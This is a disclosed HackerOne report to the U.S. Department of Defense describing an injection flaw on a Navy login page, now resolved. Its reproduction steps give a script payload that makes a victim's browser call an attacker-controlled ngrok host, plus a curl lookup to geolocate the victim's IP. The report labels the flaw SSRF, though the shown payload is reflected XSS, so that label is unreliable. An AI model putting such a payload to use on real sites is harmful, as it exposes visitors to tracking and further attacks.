---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
  - vuln/xss
  - vuln/ssrf
  - trigger/victim-interaction
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2021-01-12
submitted: 2020-10-02T04:44:22.085Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "iamrose"
source: "https://hackerone.com/reports/996273"
title: "SSRF in login page using fetch API exposes victims IP address to attacker controled server"
---
# SSRF in login page using fetch API exposes victims IP address to attacker controled server

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-01-12

- Report: [https://hackerone.com/reports/996273](https://hackerone.com/reports/996273)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2020-10-02T04:44:22.085Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Note:      This is similar to my last report #991163. 


**Summary:**
 Server Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing.
**Description:**
Server Side Request Forgery is the critical vulnerability occurring in web application where attacker can perform malicious action on behalf of server. SSRF can lead to port scanning, cross domain hijacking, pivoting , extracting system files and many more. In this case, I use ngrok to generate our custom domain to prove occurrence of SSRF. Once I have custom ngrok domain i can analyze all request that are coming to the domain.
I used fetch() API property of JS to perform cross domain request and perform Server Side Request Forgery.
 

## Step-by-step Reproduction Instructions
1. Open the URL https://www.█████████
2. Open your ngrok instance and copy your listener domain it
3. SSRF payload  '><script>fetch('your ngrok instance')</script>
4. Append payload to source parameter
5. Final Crafted URL████&source='><script>fetch('your ngrok instance')</script>&server=submit.moboard.com&display=Please+log+on&title=%3C
6. Open 127.0.0.1:4040 in browser to analyze all incoming request
7. Open URL of Step 5 from any other device than the device ngrok is running 
8.  The request from US navy hits our ngrok client in 127.0.0.1:4040
9. The request contain ip address of victim who opened the URL, browser info, Operating System and many more.
10. We can trace victim location with ~$curl ipinfo.io/IP-address-of-victim

Screenshot is attached below with the request from navy server that hit my ngrok client


## Product, Version, and Configuration (If applicable)
Browser: Firefox 80.0.1 64 Bit
## Suggested Mitigation/Remediation Actions

## Impact

Server Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing. Also, attacker can launch port scans, launch exploits to whoever visits the US NAVY Website.

## Timeline

- **Report Filed**
- **2020-10-02** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
